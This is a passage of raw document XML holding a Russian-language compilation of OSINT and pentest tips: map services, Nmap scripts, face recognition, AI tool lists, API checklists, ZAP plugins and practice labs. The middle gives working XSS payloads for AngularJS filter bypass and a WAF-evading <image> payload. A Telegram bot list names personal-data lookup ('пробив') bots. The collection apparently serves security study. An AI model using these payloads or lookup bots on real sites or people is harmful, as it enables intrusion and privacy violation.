      <text:p text:style-name="P1"><text:span text:style-name="T3">7. </text:span><text:span text:style-name="T2">Resource</text:span><text:span text:style-name="T3"> </text:span><text:span text:style-name="T2">Watch</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">resourcewatch</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">org</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">data</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">explore</text:span><text:span text:style-name="T3">) - предоставляет сотни датасетов о состоянии ресурсов и жителей планеты;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">8. </text:span><text:span text:style-name="T2">Airportwebcams</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">airportwebcams</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">net</text:span><text:span text:style-name="T3">/) - агрегатор веб-камер в различных аэропортах мира;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">9. </text:span><text:span text:style-name="T2">FIRMS</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">firms</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">modaps</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">eosdis</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">nasa</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">gov</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">map</text:span><text:span text:style-name="T3">/#</text:span><text:span text:style-name="T2">d</text:span><text:span text:style-name="T3">:24</text:span><text:span text:style-name="T2">hrs</text:span><text:span text:style-name="T3">;@0.0,0.0,3</text:span><text:span text:style-name="T2">z</text:span><text:span text:style-name="T3">)- - карта пожаров, близкая к реальному времени (задержка ~3 часа);</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">10. </text:span><text:span text:style-name="T2">OpenInfraMap</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">openinframap</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">org</text:span><text:span text:style-name="T3">/#2/26/12) - карта содержит линии электропередач, телекоммуникацию, солнечную, нефтяную, газовую, водную инфраструктуру всего мира;</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T3">11. </text:span><text:span text:style-name="T2">OpenSeaMap</text:span><text:span text:style-name="T3"> <text:s/>(</text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">map</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">openseamap</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">org</text:span><text:span text:style-name="T3">/)морская карта, информация о маяках, буях и других навигационных знаках, ремонтных мастерских, магазинах, ресторанах;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">12. </text:span><text:span text:style-name="T2">geolocatethis</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">github</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">IntelTakes</text:span><text:span text:style-name="T3">/</text:span><text:span text:style-name="T2">geolocatethis</text:span><text:span text:style-name="T3">) - позволяет запрашивать </text:span><text:span text:style-name="T2">API</text:span><text:span text:style-name="T3"> Карт </text:span><text:span text:style-name="T2">Google</text:span><text:span text:style-name="T3"> для двух конкретных мест на точном расстоянии друг от друга в пределах заданного радиуса;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">13. </text:span><text:span text:style-name="T2">globaldetentionproject</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">http</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">globaldetentionproject</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">org</text:span><text:span text:style-name="T3">/) - карта центров содержания под стражей по всему миру;</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">14. </text:span><text:span text:style-name="T2">F</text:span><text:span text:style-name="T3">4</text:span><text:span text:style-name="T2">Map</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">demo</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">f</text:span><text:span text:style-name="T3">4</text:span><text:span text:style-name="T2">map</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">com</text:span><text:span text:style-name="T3">/#</text:span><text:span text:style-name="T2">lat</text:span><text:span text:style-name="T3">=52.5177982&amp;</text:span><text:span text:style-name="T2">lon</text:span><text:span text:style-name="T3">=13.4070592&amp;</text:span><text:span text:style-name="T2">zoom</text:span><text:span text:style-name="T3">=17&amp;</text:span><text:span text:style-name="T2">camera</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">phi</text:span><text:span text:style-name="T3">=-60.734) - карта мира с 3</text:span><text:span text:style-name="T2">D</text:span><text:span text:style-name="T3">-зданиями и тенями от них в различное время суток;</text:span></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T3">15. </text:span><text:span text:style-name="T2">Shadowmap</text:span><text:span text:style-name="T3"> (</text:span><text:span text:style-name="T2">https</text:span><text:span text:style-name="T3">://</text:span><text:span text:style-name="T2">shadowmap</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">org</text:span><text:span text:style-name="T3">/) - еще одна карта с 3</text:span><text:span text:style-name="T2">D</text:span><text:span text:style-name="T3">-зданиями и тенями</text:span></text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">Топ 7 скриптов для сканера </text:span><text:span text:style-name="T2">NMAP</text:span><text:span text:style-name="T3">:</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">Dns</text:span><text:span text:style-name="T3"> - </text:span><text:span text:style-name="T2">brute</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">nse</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">Traceroute</text:span><text:span text:style-name="T3"> - отображает географическое местоположение цели.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">firewalk</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">nse</text:span><text:span text:style-name="T3"> - этот скрипт пытается узнать правила брандмауэра.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">Http</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">sitemap</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">generator</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">nse</text:span><text:span text:style-name="T3"> - Паук вэб-сервера который отображает структуру сайта, файлы и каталоги.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">HTTP</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">methods</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">nse</text:span><text:span text:style-name="T3"> - определяет какие параметры поддерживаются </text:span><text:span text:style-name="T2">HTTP</text:span><text:span text:style-name="T3">-сервером, отправив запрос </text:span><text:span text:style-name="T2">OPTIONS</text:span><text:span text:style-name="T3">. Он проверяет те методы, которые не указаны в заголовках </text:span><text:span text:style-name="T2">OPTIONS</text:span><text:span text:style-name="T3">, и видит, реализованы ли они.</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">Whois</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">domain</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">nse</text:span><text:span text:style-name="T3"> - получает информацию о доменном имени цели.</text:span></text:p>
      <text:p text:style-name="P4" loext:marker-style-name="T1"><text:span text:style-name="T2">Shodan</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">api</text:span><text:span text:style-name="T3">.</text:span><text:span text:style-name="T2">nse</text:span><text:span text:style-name="T3"> - этот скрипт попросит </text:span><text:span text:style-name="T2">API</text:span><text:span text:style-name="T3"> ключик для поисковика </text:span><text:span text:style-name="T2">SHODAN</text:span><text:span text:style-name="T3">. Выдаст всю информацию о хосте, которая имеется в </text:span><text:span text:style-name="T2">SHODAN</text:span><text:span text:style-name="T3">-</text:span><text:span text:style-name="T2">e</text:span></text:p>
      <text:p text:style-name="P2">Продукты Hunt Intellegence:</text:p>
      <text:p text:style-name="P26">1. Huntintel (https://www.huntintel.io/) - сервис, который позволяет определять геолокацию у постов из различных социальных сетей: ВКонтакте, Twitter, Snapchat, продуктах Meta и так далее. Есть 7-и дневная триалка.</text:p>
      <text:p text:style-name="P26">2. BirdHunt (https://birdhunt.co/) - бесплатный OSINT-инструмент только для Twitter.</text:p>
      <text:p text:style-name="P4"><text:soft-page-break/><text:span text:style-name="T3">3. InstaHunt (https://instahunt.co/) - бесплатный OSINT-инструмент только для Instagram.</text:span></text:p>
      <text:p text:style-name="P6">Самый простой API распознавания лиц на Python: Распознавайте и манипулируйте лицами из Python с помощью самой простой в мире библиотеки распознавания лиц Face Recognition (https://github.com/ageitgey/face_recognition). Предоставляется вместе с простым инструментом командной строки, позволяющим распознавать лица. Подробную инструкцию по установке (https://github.com/ageitgey/face_recognition#installation) ищите в репозитории. Примеры кода (https://github.com/ageitgey/face_recognition#python-code-examples) на Python доступны там же. После установки станут доступны две утилиты командной строки. Face_recognition распознает лица на фотографии или в папке, полной фотографий, и определяет, кто они. Face_detection позволяет найти местоположение (координаты пикселей) любых лиц. Утилита создана с использованием современного распознавания лиц dlib (http://dlib.net/), построенного с помощью глубокого обучения. Модель имеет точность 99,38% на стандарте Labeled Faces in the Wild (http://vis-www.cs.umass.edu/lfw/).</text:p>
      <text:p text:style-name="P2">Обход фильтрации в AngularJS:</text:p>
      <text:p text:style-name="P2">AngularJS (https://angularjs.org/) - это JavaScript-фреймворк с открытым исходным кодом, предназначенный для разработки одностраничных приложений. Часто используется различными конструкторами сайтов. Если вам требуется короткая полезная нагрузка для XSS в AngularJS 1.2.24 - 1.2.29, то можно воспользоваться той, что представлена ниже:</text:p>
      <text:p text:style-name="P2">{{[].%22-alert`1`-%22}}</text:p>
      <text:p text:style-name="P2">По этой ссылке (https://portswigger-labs.net/xss/angularjs.php?type=reflected&amp;csp=0&amp;version=1.2.26&amp;x=%7B%7B%5B%5D.%22-alert%601%60-%22%7D%7D) пример её выполнения для версии 1.2.26.</text:p>
      <text:p text:style-name="P2">Фильтрацию самой последней версии AngularJS можно обойти с помощью Unicode и HTML кодирования:</text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">{{$on.constructor('%26bsol;%26bsol;u%26bsol;u007b61}lert`1`')()}}</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P4"><text:span text:style-name="T3">По этой ссылке (https://portswigger-labs.net/xss/angularjs.php?type=reflected&amp;csp=0&amp;version=1.8.2&amp;x=%7B%7B$on.constructor(%27%26bsol;</text:span><text:soft-page-break/><text:span text:style-name="T3">%26bsol;u%26bsol;u007b61%7Dlert%601%60%27)()%7D%7D) пример её выполнения для версии 1.8.2.</text:span></text:p>
      <text:p text:style-name="P2">Необычный случай обхода файрвола веб-приложения (WAF):</text:p>
      <text:p text:style-name="P2">- WAF заблокировал тег &lt;img&gt;;</text:p>
      <text:p text:style-name="P2">- Атрибут «src» также блокируется;</text:p>
      <text:p text:style-name="P2">- Однако, найденный WAF не блокировал тег &lt;image&gt;;</text:p>
      <text:p text:style-name="P2">- Используем нагрузку (без двойных кавычек) "&lt;image src/r/n=validimage.jpg onloadend='new class extends(co\u006d)/**/''&amp;lcub;&amp;rcub;'&gt;" и получаем XSS.</text:p>
      <text:p text:style-name="P27">Данная нагрузка обходит Dotdefender, Comodo и еще несколько WAF.</text:p>
      <text:p text:style-name="P26">Используем блага нейросетей. Часть 8:</text:p>
      <text:p text:style-name="P2">1. https://linguix.com/ - исправляет орфографические, пунктуационные и синтаксические ошибки в тексте;</text:p>
      <text:p text:style-name="P2">2. https://lalamu.studio/demo/ - реалистичная озвучка различных персонажей;</text:p>
      <text:p text:style-name="P2">3. https://skybox.blockadelabs.com/ - простое оформление 3D проектов;</text:p>
      <text:p text:style-name="P2">4. https://metabob.com/ - неплохой помощник программиста;</text:p>
      <text:p text:style-name="P2">5. https://www.pixelfy.ai/ - ИИ для создания пиксельного арта;</text:p>
      <text:p text:style-name="P2">6. https://www.readyrunner.ai/ - десктоп версия помощника на основе ChatGPT;</text:p>
      <text:p text:style-name="P2">7. https://github.com/SevaSk/ecoute - вытаскивает текст из любых видео;</text:p>
      <text:p text:style-name="P2">8. https://dreaminterpreter.ai/ - толкует ваши сновидения;</text:p>
      <text:p text:style-name="P2">9. https://durable.co/ - ИИ для создания сайтов;</text:p>
      <text:p text:style-name="P6">10. http://perplexity.ai/ - ChatGPT на стеройдах</text:p>
      <text:p text:style-name="P2">Большая подборка OSINT ботов:</text:p>
      <text:p text:style-name="P2">1. @username_to_id_bot - позволяет узнать Telegram ID;</text:p>
      <text:p text:style-name="P2">2. @fykutokabimo49bot - зеркало Глаза Бога;</text:p>
      <text:p text:style-name="P2">3. @helper_inform_bot - зекрало smartseacrh;</text:p>
      <text:p text:style-name="P2">4. @QuickOSINT_bot - еще один известный OSINT бот;</text:p>
      <text:p text:style-name="P2">5. @UsersSearchBot - неплохой платный пробив-бот;</text:p>
      <text:p text:style-name="P2">6. @Zernerda_bot - один из новых OSINT-ботов;</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T3">7. @maigret_osint_bot - поиск по нику;</text:span></text:p>
      <text:p text:style-name="P2">8. @SovaAppBot - бесплатный пробив-бот;</text:p>
      <text:p text:style-name="P2">9. @ibhldr_bot - выявляет интересы пользователя;</text:p>
      <text:p text:style-name="P6">10. @telesint_bot - определяет чаты пользователя</text:p>
      <text:p text:style-name="P2">Небольшая подборка полезных ресурсов и чеклистов по пентесту API:</text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">OWASP API Security Top 10 (</text:span><text:span text:style-name="T3">на</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">русском</text:span><text:span text:style-name="T2"> (https://habr.com/ru/company/owasp/blog/547174/))</text:span></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">HolyTips (https://github.com/HolyBugx/HolyTips/blob/main/Checklist/API%20Security.pdf)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">API-Audit-Checklist (https://www.apiopscycles.com/api-audit-checklist)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">31-days-of-API-Security-Tips (https://github.com/inonshk/31-days-of-API-Security-Tips)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">API Security Checklist (https://github.com/shieldfy/API-Security-Checklist)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">OAuth 2.0 Threat Model Pentesting Checklist (https://web.archive.org/web/20210607123429/https://www.binarybrotherhood.io/oauth2_threat_model.html)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">JWT Security Cheat Sheet (https://assets.pentesterlab.com/jwt_security_cheatsheet/jwt_security_cheatsheet.pdf)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">Microservices Security Cheat Sheet (https://cheatsheetseries.owasp.org/cheatsheets/Microservices_security.html)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">GraphQL Cheat Sheet (https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">REST Assessment Cheat Sheet (https://cheatsheetseries.owasp.org/cheatsheets/REST_Assessment_Cheat_Sheet.html)</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P25" loext:marker-style-name="T1"><text:span text:style-name="T2">REST Security Cheat Sheet (https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html)</text:span></text:p>
      <text:p text:style-name="P31" loext:marker-style-name="T1"><text:span text:style-name="T2">API Security Encyclopedia (https://apisecurity.io/encyclopedia/content/api-security-encyclopedia.htm)</text:span></text:p>
      <text:p text:style-name="P2">Набор инструментов для тестирования безопасности WebSockets:</text:p>
      <text:p text:style-name="P20"><text:span text:style-name="T3">Это исследование было впервые представлено на OWASP Global AppSec US 2021 (https://owaspglobalappsecus2021.sched.com/event/n98a/were-not-in-http-</text:span><text:soft-page-break/><text:span text:style-name="T3">anymore-investigating-websocket-server-security). Серверы WebSocket в значительной степени игнорируются в сообществе безопасности, несмотря на высокую распространенность их применения в современных веб приложениях. Во многом это связано с отсутствием полноценных инструментов тестирования. Для решения этой проблемы разработан инструмент под названием STEWS (https://github.com/PalindromeLabs/STEWS), позволяющий: 1. Находить конечные точки WebSocket сервера (сканирует более 5000 URL-адресов в секунду); 2. Снимать фингерпринт WebSocket сервера (с использованием идентификаторов, обнаруженных в представленном исследовании); 3. Выполнять обнаружение уязвимых серверов WebSocket с помощью известных векторов эксплуатации. Дополнительные репозитории, созданные в рамках этого исследования, включают в себя: Awesome WebSockets Security (https://github.com/PalindromeLabs/awesome-websocket-security), который компилирует информацию о безопасности WebSockets для других исследователей; Репозиторий WebSockets-Playground (https://github.com/PalindromeLabs/WebSockets-Playground), который представляет собой скрипт для легкого запуска нескольких локальных серверов WebSocket параллельно. Ссылка на инструмент (https://github.com/PalindromeLabs/STEWS) Когда пытаешься что-то где-то геолоцировать очень важно обращать внимание на каждую деталь. Потому что, частенько, именно небольшая деталь может подсказать, где искать нужное место. Есть конечно же матёрые товарищи, которые по архитектурным особенностям с одного взгляда определяют город, ну или помнят, как, например, выглядят дорожные знаки Австралии. Но большинству осинтеров, особенно любителям, помнить всё это очень необязательно, а достаточно просто знать где можно посмотреть все эти нюансы. https://geotips.net - выбираем нужную страну и получаем подробную информацию. Флаг, карта, примеры архитектуры, дорожные знаки, разметка, как выглядят автомобильные номера, топографическая информация, ну и так далее. Короче все особенности конкретной страны, которые могут быть полезны. https://www.citypopulation.de - статистическая информация по странам. Выбираем страну, смотрим инфу о населении, транспорте, административном делении, промышленности и т.д. Всё это с кучей таблиц и цифр, в том числе за разные года и периоды времени.</text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T3">Подборка сервисов для шифрования, хеширования и расшифровки данных онлайн:</text:span></text:p>
      <text:p text:style-name="P2">1. https://sanstv.ru/tools/crypt - поддерживаемые алгоритмы: cast-128, gost, rijndael-128, twofish, cast-256, loki97, rijndael-192, saferplus, blowfish-compat, des, rijndael-256, serpent, xtea, blowfish, rc2, tripledes, md5 (Хеш), sha1 (Хеш), base64, crc32 (Расчет контрольной суммы), Русский текст -&gt; Транслит, ABC -&gt; \xAA.</text:p>
      <text:p text:style-name="P25"><text:span text:style-name="T3">2. http://crypt-online.ru/ - поддерживаемые алогритмы: base64, MD5, SHA256, AES(128-256), RC4, RSA. Утилиты</text:span><text:span text:style-name="T2">: Text to hex, Hex to text, Json, QR </text:span><text:span text:style-name="T3">коды</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">и</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">др</text:span><text:span text:style-name="T2">.</text:span></text:p>
      <text:p text:style-name="P26">3. https://planetcalc.ru/search/?tag=813 - поддерживает шифр Цезаря, Виженера, Хилла, Атбаш, A1Z26, Плейфера и шифр масонов. </text:p>
      <text:p text:style-name="P2">4. https://www.dcode.fr/ - известный сайт, поддерживает многие алгоритмы, есть математические, IT инструменты и не только.</text:p>
      <text:p text:style-name="P7">5. https://www.boxentriq.com/code-breaking/cipher-identifier - определяет тип шифра, есть инструменты работы с текстом.</text:p>
      <text:p text:style-name="P2">Используем блага нейросетей. Часть 9:</text:p>
      <text:p text:style-name="P2">1. Anything AI (http://anything-ai.com/) - может заменить любой объект на вашем фото. Бесплатный, не требует регистрации. </text:p>
      <text:p text:style-name="P2">2. StyleDrop (https://styledrop.github.io/) - создаст вам картину по запросу, при этом скопирует стиль оригинального изображения.</text:p>
      <text:p text:style-name="P2">3. SmartStudy (https://smartstudy.streamlit.app/) - составит тест из 10 вопросов под вашу тему. Просто скормите ему документ с текстом. </text:p>
      <text:p text:style-name="P2">4. gptnext (https://gptnext.co/) - бесплатная копия Chat-GPT. Работает с перебоями.</text:p>
      <text:p text:style-name="P2">5. BratGPT <text:s/>(http://bratgpt.com/) - агрессивная версия ChatGPT, без тормозов. </text:p>
      <text:p text:style-name="P2">6. Fictiverse: Redream (https://github.com/Fictiverse/Redream) - превращает картинку в аниме в реальном времени. </text:p>
      <text:p text:style-name="P6">7. Pixel art (https://www.pixellab.ai/) - позволяет создать полноценную 2D-пикчу из обычного эскиза. Пока бета</text:p>
      <text:p text:style-name="P2">Небольшая подборка плагинов для OWASP ZAP:</text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T3">Access Control Testing (https://www.zaproxy.org/docs/desktop/addons/access-control-testing/) Позволяет проводить тестирование контроля доступа и выявлять потенциальные проблемы с контролем доступа. </text:span></text:p>
      <text:p text:style-name="P2">Advanced SQLInjection Add-on (https://www.zaproxy.org/docs/desktop/addons/advanced-sqlinjection-scanner/) Инструмент активного сканирования для обнаружения SQLi (на основе SQLMap).</text:p>
      <text:p text:style-name="P2">Attack Surface Detector (https://github.com/secdec/attack-surface-detector-zap/wiki) Плагин помогает выявить конечные точки веб-приложения, параметры, которые принимают эти конечные точки, и тип данных этих параметров.</text:p>
      <text:p text:style-name="P2">DOM XSS Active Scan Rule (https://www.zaproxy.org/docs/desktop/addons/dom-xss-active-scan-rule/) Активный сканер для обнаружения уязвимостей DOM XSS.</text:p>
      <text:p text:style-name="P2">Directory List v2.3 (https://www.zaproxy.org/docs/desktop/addons/directory-list-v2.3/) Предоставляет файлы с именами каталогов для брутфорса или фаззинга.</text:p>
      <text:p text:style-name="P2">Eval Villain (https://www.zaproxy.org/docs/desktop/addons/eval-villain/) Расширение для ZAP и Firefox, которое будет подключаться к опасным функциям, таким как eval, и предупреждать вас об их использовании.</text:p>
      <text:p text:style-name="P2">GraphQL Support (https://www.zaproxy.org/docs/desktop/addons/graphql-support/) Плагин для получения структуры и запросов GraphQL. </text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">Out-of-band Application Security Testing Support (https://www.zaproxy.org/docs/desktop/addons/oast-support/) </text:span><text:span text:style-name="T3">Сервер</text:span><text:span text:style-name="T2"> OAST </text:span><text:span text:style-name="T3">для</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">обнаружения</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">внешних</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">и</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">слепых</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">уязвимостей</text:span><text:span text:style-name="T2">. </text:span><text:span text:style-name="T3">Аналог Burp Collaborator, только для ZAP.</text:span></text:p>
      <text:p text:style-name="P26">HUNT v2 (https://github.com/bugcrowd/HUNT/tree/master/Remix) Выполняет пассивное сканирование на наличие потенциально уязвимых параметров.</text:p>
      <text:p text:style-name="P32">Community-scripts - (https://github.com/zaproxy/community-scripts) Большая коллекция скриптов ZAP предоставленная комьюнити</text:p>
      <text:p text:style-name="P1"><text:span text:style-name="T3">Подборка лабораторий для практики веб-пентеста: SQLi - Ссылка на GitHub (https://github.com/Audi-1/sqli-labs); Oauth 2.0 - Ссылка на GitHub </text:span><text:soft-page-break/><text:span text:style-name="T3">(https://github.com/koenbuyens/Vulnerable-OAuth-2.0-Applications); GraphQL - Ссылка на GitHub (https://github.com/david3107/graphql-security-labs);</text:span></text:p>
      <text:p text:style-name="P7">JWT Authentication - Ссылка на GitHub (https://github.com/Sjord/jwtdemo); SAML Authentication - Ссылка на GitHub (https://github.com/yogisec/VulnerableSAMLApp); XSS - Ссылка на GitHub (https://portswigger.net/web-security/cross-site-scripting). Web Cache Poisoning: SSRF - Ссылка на GitHub (https://github.com/incredibleindishell/SSRF_Vulnerable_Lab); XXE - Ссылка на GitHub (https://github.com/jbarone/xxelab); LFI - Ссылка на GitHub (https://github.com/paralax/lfi-labs); CSRF - Ссылка на GitHub (https://portswigger.net/web-security/csrf); Java deserialization - Ссылка на GitHub (https://github.com/NickstaDB/DeserLab); HTTP-Smuggling - Ссылка на GitHub (https://github.com/ZeddYu/HTTP-Smuggling-Lab); Prototype Pollution - Ссылка на GitHub (https://github.com/RafaelSantos025/PrototypePollution-Lab); Business logic - Ссылка на GitHub (https://portswigger.net/web-security/logic-flaws); WebSockets - Ссылка на GitHub (https://portswigger.net/web-security/websockets); SSTI - Ссылка на GitHub (https://github.com/Audi-1/sqli-labshttps://github.com/TROUBLE-1/White-box-pentesting).</text:p>
      <text:p text:style-name="P2">Используем блага нейросетей. Часть 10:</text:p>
      <text:p text:style-name="P2">1. Auphonic (https://auphonic.com/) - корректирует и оптимизирует звук, широкий функционал;</text:p>
      <text:p text:style-name="P2">2. Retrato (https://www.retrato.app/) - превращает ваши селфи в профессиональные фото; Retrato </text:p>
      <text:p text:style-name="P2">3. Mindgrasp (https://mindgrasp.ai/) - делает выжимку по видеоролику и отвечает на вопросы</text:p>
      <text:p text:style-name="P2">4. AI GIF Generator (https://picsart.com/create/editor?category=miniapps&amp;irclickid=SpZzx6xjbxyPUoUwiRzDy1aXUkF2z%3AU2eVD0VI0&amp;utm_source=Affiliate&amp;utm_medium=Impact&amp;irgwc=1&amp;clickid=SpZzx6xjbxyPUoUwiRzDy1aXUkF2z%3AU2eVD0VI0) - создает прикольные гифки по короткому описанию;</text:p>
      <text:p text:style-name="P1" loext:marker-style-name="T1"><text:span text:style-name="T2">5. Blue Willow (https://www.bluewillow.ai/) - </text:span><text:span text:style-name="T3">аналоги</text:span><text:span text:style-name="T2"> MidJourney; </text:span></text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:span text:style-name="T3">6. Leonardo AI (https://app.leonardo.ai/ai-generations) - еще один, считается лучшим;</text:span></text:p>
      <text:p text:style-name="P6">7. Roamaround (https://www.roamaround.io/) - годный помощник путешественника.</text:p>
      <text:p text:style-name="P2">Нейросети - Помощники:</text:p>
      <text:p text:style-name="P2">1. ИИ, который делает за тебя презентации и сам генерит к ним картинки, но еще эта нейронка (https://tome.app/votefak) может сделать тебе презентацию компании, проекта и даже помочь составить портфолио. Так что заценить стоит;</text:p>
      <text:p text:style-name="P26">2. Нейронка-мультитул, если вдруг понадобится (https://magicstudio.com/ru/) отредачить фотку для резюме или инсты или картинку для презентации;</text:p>
      <text:p text:style-name="P26">3. Бот, который соберёт (https://noowai.com/) всё нужное по запросу в сжатом виде. По сути тот же поисковик, только без воды;</text:p>
      <text:p text:style-name="P32">4. А эта нейронка (https://silatus.com/) похожа на предыдущую, но она уже делает ресерч по любой теме - фильмы, книги, люди, или какие-то события.</text:p>
      <text:p text:style-name="P33">Используем блага нейросетей. Часть 11:</text:p>
      <text:p text:style-name="P2">1. Aalab (https://www.aalab.com/) фотошоп на стероидах, триальная версия 3 дня; </text:p>
      <text:p text:style-name="P2">2. GPT-Migrate (https://github.com/0xpayne/gpt-migrate) переводит с одного языка программирования на другой, нужен API от OpenAI; </text:p>
      <text:p text:style-name="P2">3. Wonder Studio (https://wonderdynamics.com/) простой видеоредактор в два клика создает CGI и графику.</text:p>
      <text:p text:style-name="P2">4. OpenResume (https://github.com/xitanggg/open-resume) создает крутые резюме; </text:p>
      <text:p text:style-name="P2">5. Ambient (https://ambient.twine.us/) анализирует речь собеседников при созвоне (напр. в Zoom) и делает краткие заметки;</text:p>
      <text:p text:style-name="P2">6. Zeroscope (https://replicate.com/anotherjesse/zeroscope-v2-xl) генерирует эпичные видео с котами; </text:p>
      <text:p text:style-name="P2">7. PicWish (https://picwish.com/photo-enhancer) может в 4 раза повысить число пикселей на фото, сделав изображение более четким;</text:p>
      <text:p text:style-name="P2">8. voice-over-translation (https://github.com/ilyhalight/voice-over-translation) закадровый перевод видео с бразуерах;</text:p>
      <text:p text:style-name="P2">9. Vectorizer (https://vectorizer.ai/) может превратить обычную картинку в векторную;</text:p>
      <text:p text:style-name="P6">10. Kapwing AI (https://www.kapwing.com/ai) видеоредактор с ИИ функционалом, есть триал.</text:p>
